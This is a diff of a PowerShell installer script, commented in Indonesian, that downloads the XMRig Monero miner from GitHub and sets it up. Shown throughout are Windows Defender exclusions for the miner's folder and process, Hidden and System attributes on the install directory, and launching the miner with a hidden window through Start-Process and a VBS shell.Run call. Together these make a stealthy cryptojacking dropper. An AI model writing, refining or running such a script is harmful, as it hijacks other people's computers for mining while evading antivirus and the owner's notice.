@@ -76,23 +76,23 @@ Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue
 
 # ==========================================
-# 4. UNDUH & EKSTRAK BINER XMRIG (MONEROOCEAN FORK)
+# 4. UNDUH & EKSTRAK BINER XMRIG (MONEROOCEAN REPO ZIP)
 # ==========================================
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-# Menggunakan repository resmi MoneroOcean fork xmrig yang mendukung full algo switching & benchmark otomatis
-$DownloadUrl = "https://github.com/MoneroOcean/xmrig/releases/download/v6.21.0-mo4/xmrig-6.21.0-mo4-msvc-win64.zip"
+# Menggunakan link raw langsung dari repository xmrig_setup Anda
+$DownloadUrl = "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip"
 Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath
 
 if (Test-Path $ZipPath) {
     Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force
-    $ExtractedFolder = Get-ChildItem -Path $env:TEMP -Filter "xmrig-*" | Where-Object { $_.PSIsContainer } | Select-Object -First 1
-    $ExtractedExe = Join-Path $ExtractedFolder.FullName "xmrig.exe"
     
-    if (Test-Path $ExtractedExe) { 
-        Copy-Item -Force $ExtractedExe $ExePath 
+    # Mencari file xmrig.exe di dalam hasil ekstraksi secara fleksibel
+    $ExtractedExe = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1
+    
+    if ($ExtractedExe -and (Test-Path $ExtractedExe.FullName)) { 
+        Copy-Item -Force $ExtractedExe.FullName $ExePath 
     }
     
-    Remove-Item -Recurse -Force $ExtractedFolder.FullName -ErrorAction SilentlyContinue
     Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
 
     Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue
@@ -124,7 +124,7 @@ shell.Run """$ExePath"" $ArgsList", 0, False
     # Jalankan langsung
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses dengan MoneroOcean Fork di: $Dir" -ForegroundColor Green
+    Write-Host "Setup sukses menggunakan biner dari repository MoneroOcean!" -ForegroundColor Green
 } else {
-    Write-Host "Gagal mengunduh biner miner MoneroOcean." -ForegroundColor Red
+    Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
 }
